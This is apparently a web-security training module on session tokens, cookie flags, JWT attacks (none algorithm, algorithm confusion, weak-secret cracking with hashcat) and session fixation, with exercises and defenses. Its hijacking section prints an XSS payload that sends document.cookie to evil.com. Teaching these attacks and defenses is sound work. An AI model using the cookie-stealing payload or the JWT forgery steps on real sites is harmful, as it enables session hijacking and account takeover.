# Session Management and Token Handling

## 1. Orientation

### What this module covers
This module examines how applications maintain authenticated state—session tokens, JWTs, and cookie security. Session hijacking is often easier than credential theft and instantly bypasses multi-factor authentication.

### Fit in the Learning Path
Once authenticated, the session token becomes your identity. Stealing a session token is equivalent to stealing both the password AND any 2FA code. Understanding session security is critical for both attack and defense.

### Learning Objectives
By the end of this module, you will:
*   Understand session management mechanisms
*   Identify session vulnerabilities
*   Apply JWT attack techniques
*   Test session security effectively

---

## 2. Core Content

### Mental Model: Session as Identity

**How professionals think about this:**
The session token IS security. Everything after authentication trusts this token. If the token is compromised, authentication controls become irrelevant.

```
SESSION SECURITY MODEL:

┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│   AUTHENTICATION                                                    │
│   (Username + Password + 2FA)                                       │
│           │                                                         │
│           │ Proves identity ONCE                                    │
│           ▼                                                         │
│   ┌───────────────────────────────────────────────────────────────┐│
│   │                    SESSION TOKEN                               ││
│   │                                                                ││
│   │  Cookie: session=eyJhbGciOiJIUzI1NiJ9...                       ││
│   │                                                                ││
│   │  This token IS the authenticated identity                      ││
│   │  Whoever has this token IS you                                 ││
│   │                                                                ││
│   └───────────────────────────────────────────────────────────────┘│
│           │                                                         │
│           │ Used for EVERY subsequent request                       │
│           ▼                                                         │
│   REQUEST → Server checks token → Grants access                     │
│   REQUEST → Server checks token → Grants access                     │
│   REQUEST → Server checks token → Grants access                     │
│           │                                                         │
│           │ If attacker steals token:                               │
│           │   - No need for password                                │
│           │   - No need for 2FA                                     │
│           │   - Full account access                                 │
│           ▼                                                         │
│   ATTACKER = AUTHENTICATED USER                                     │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Session Token Types

**Cookie-based sessions:**

```http
Set-Cookie: session_id=abc123def456; Path=/; HttpOnly; Secure; SameSite=Strict

SESSION ID REQUIREMENTS:
- Random (cryptographically secure RNG)
- Long enough (>128 bits of entropy)
- Unpredictable (no pattern between IDs)
- Unique per session
```

**JWT (JSON Web Token):**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNjQ3MzYyMDAwfQ.signature

DECODED:
Header: {"alg":"HS256","typ":"JWT"}
Payload: {"user_id":"5","role":"user","exp":1647362000}
Signature: HMAC-SHA256(header.payload, secret)
```

**API Tokens:**

```
Authorization: Bearer xyzABC123secrettoken789

Used for: API authentication, service-to-service
Characteristics: Long-lived, high entropy, often static
```

### Session ID Vulnerabilities

**Predictable session IDs:**

```
VULNERABLE PATTERN:

Session IDs:
- User 1: session=1000
- User 2: session=1001
- User 3: session=1002

ATTACK:
session=1003 → Access user 4's account (enumeration)

ANOTHER PATTERN:
session=base64(user_id + timestamp)
session=MTItMTY0NzM2MjAwMA==
Decode: 12-1647362000 (user_id=12)

ATTACK:
Create: 1-1647362000 → Access admin (user_id=1)
```

**Weak entropy:**

```
INSUFFICIENT RANDOMNESS:

PHP session (default): Good - 128 bits
Custom: "SESS" + time() → Bad - seconds since epoch (predictable)

TEST:
1. Create 1000 sessions quickly
2. Analyze patterns
3. If predictable → vulnerability
```

### Cookie Security Attributes

**Essential cookie flags:**

| Attribute | Purpose | Attack It Prevents |
|-----------|---------|-------------------|
| **HttpOnly** | JS can't access cookie | XSS session theft |
| **Secure** | Only send over HTTPS | Session sniffing |
| **SameSite=Strict** | No cross-site sending | CSRF |
| **SameSite=Lax** | Limited cross-site | Some CSRF |
| **Domain** | Limit cookie scope | Subdomain attacks |
| **Path=/app** | Limit to path | Path-based attacks |

**Insecure cookie example:**

```http
# VULNERABLE - Missing protections
Set-Cookie: session=abc123

# ATTACK POSSIBILITIES:
# - XSS: document.cookie (no HttpOnly)
# - MITM: Sent over HTTP (no Secure)
# - CSRF: Sent cross-site (no SameSite)

# SECURE:
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
```

### JWT Attacks

**JWT structure review:**

```
BASE64(Header).BASE64(Payload).SIGNATURE

Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"user":"admin","exp":1234567890}
Signature: HMACSHA256(base64Header + "." + base64Payload, secret)
```

**Attack 1: None algorithm:**

```
ORIGINAL:
Header: {"alg":"HS256"}
Payload: {"user":"regular"}
Signature: valid_signature

ATTACK:
Header: {"alg":"none"}      ← Change algorithm to none
Payload: {"user":"admin"}   ← Modify claims
Signature: (empty)          ← No signature needed

# If server accepts alg=none:
# Token is valid without signature
# Full account takeover
```

**Attack 2: Algorithm confusion:**

```
SCENARIO:
Server supports RS256 (asymmetric) and HS256 (symmetric)
RS256 uses: Private key to sign, Public key to verify
HS256 uses: Same secret for sign and verify

ATTACK:
1. Get server's public key (often exposed)
2. Create JWT signed with HS256 using public key as secret
3. Server tries RS256, fails
4. Server falls back to HS256, uses public key as secret
5. Signature validates! (Public key is now "shared secret")
```

**Attack 3: Weak secret:**

```bash
# JWT signed with weak secret

# Extract signature
echo "eyJhbG....signature" | cut -d. -f3 | base64 -d > sig.bin

# Brute force with hashcat
hashcat -m 16500 -a 3 jwt.txt wordlist.txt

# If secret is "secret123":
# You can now forge any JWT claim
# Create {"role":"admin"} token
```

### Session Fixation

**Attack flow:**

```
SESSION FIXATION:

1. ATTACKER gets session ID from site
   → site.com gives: session=ATTACKER123

2. ATTACKER sends victim link:
   site.com/login?session_id=ATTACKER123

3. VICTIM clicks, logs in
   → Victim authenticates, same session ATTACKER123

4. ATTACKER uses session=ATTACKER123
   → ATTACKER is now logged in as victim

VULNERABLE CONDITION:
- Session ID accepted from URL parameter
- Session ID not regenerated after login
```

**Prevention check:**

```
BEFORE LOGIN:
session_id=ABC123

AFTER LOGIN:
session_id=XYZ789 (NEW ID generated)

If session_id stays ABC123 → Vulnerable
```

### Session Hijacking Methods

**Attack vectors:**

```
SESSION HIJACKING METHODS:

1. XSS (Cross-Site Scripting)
   <script>document.location='http://evil.com/?c='+document.cookie</script>
   Defense: HttpOnly cookies

2. Network sniffing (HTTP)
   Wireshark → capture cookie in cleartext
   Defense: Secure flag, HTTPS only

3. Physical access
   Copy cookie from browser storage
   Defense: Session timeout, device binding

4. Malware/keylogger
   Steal cookie from memory/file
   Defense: Short-lived sessions

5. Session prediction
   Guess sequential session IDs
   Defense: Cryptographic randomness
```

### Token Storage Security

**Storage options comparison:**

| Storage | XSS Vulnerable | CSRF Vulnerable | Recommended |
|---------|----------------|-----------------|-------------|
| localStorage | Yes (JS access) | No | For non-sensitive |
| sessionStorage | Yes (JS access) | No | For non-sensitive |
| HttpOnly Cookie | No | Yes (needs SameSite) | Yes, with SameSite |
| Memory (JS var) | Yes (XSS) | No | For short operations |

```
BEST PRACTICE:

Token in HttpOnly cookie (can't be stolen via XSS)
SameSite=Strict (can't be sent via CSRF)
Short expiration (limits exposure window)
Refresh token rotation (detect theft)
```

### Session Logout Security

**Insecure logout:**

```
CLIENT-SIDE ONLY LOGOUT (JWT):

User clicks "Logout"
→ Client deletes JWT from storage
→ JWT still VALID until expiration

ATTACK:
1. Steal JWT before user logs out
2. User "logs out" (deletes local copy)
3. Attacker still has valid JWT
4. Access continues until natural expiration

PROPER LOGOUT (Server-side):
→ Add token to blacklist
→ Check blacklist on every request
→ Token immediately invalid
```

---

## 3. Guided Practice

### Exercise 1: JWT Decoding

Decode this JWT (use jwt.io):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzAwMDAwMDAwfQ.2Gry6XvK7qXJEHkN8Gp3Q2Wfg7V8Y5UxA0KjZL1Xyeo
```

Algorithm: ___
User: ___
Role: ___
Expiration: ___

### Exercise 2: Cookie Analysis

Analyze this cookie and identify weaknesses:

```http
Set-Cookie: session=abc123; Path=/
```

Missing attributes: ___
Attack possibilities: ___

### Exercise 3: Session Attack Classification

Match the attack to the vulnerability:

| Attack | Vulnerability |
|--------|---------------|
| Attacker knows victim's session ID will be 1005 | ___ |
| XSS steals document.cookie | ___ |
| JWT with {"alg":"none"} accepted | ___ |
| Session ID unchanged after login | ___ |

---

## 4. Reflection Check

### Understanding Sessions
1. Why is stealing a session token equivalent to stealing password + 2FA?

2. A JWT is signed with HS256. Is the payload encrypted?

3. User logs out but attacker still has their JWT. Why might access continue?

### Attack Thinking
1. HttpOnly is set. How else might you obtain the session cookie?

2. You find the JWT secret is "password123". What can you do?

3. Session IDs change every request (rotation). Is this more or less secure?

---

## 5. Key Misconceptions

**MYTH: "Base64 encoding in JWT protects the payload"**
REALITY: Base64 is encoding, not encryption. Anyone can read JWT payloads.

**MYTH: "HttpOnly prevents all session theft"**
REALITY: HttpOnly only prevents JavaScript access. Network sniffing, malware, and physical access still work.

**MYTH: "JWT is more secure than session cookies"**
REALITY: JWT has its own vulnerabilities (none algorithm, weak secrets). Neither is inherently more secure.

**MYTH: "Logging out deletes the session"**
REALITY: For stateless tokens (JWT), client-side deletion doesn't invalidate the token. Server-side blacklisting is needed.

**MYTH: "SameSite=Lax is sufficient"**
REALITY: Lax still allows some cross-site scenarios. Strict is more secure but may break functionality.

---

## 6. Completion Criteria

This module is complete when you can:

1. **Decode** and analyze JWTs
2. **Identify** session security weaknesses
3. **Test** for session fixation vulnerabilities
4. **Explain** JWT attack vectors (none algorithm, weak secret)
5. **Evaluate** cookie security attributes

---

## 7. Further Depth (Optional)

*   **Tool:** jwt.io for decoding, jwt_tool for attacks
*   **Practice:** PortSwigger JWT labs
*   **Research:** OAuth token security
*   **Reading:** OWASP Session Management Cheat Sheet
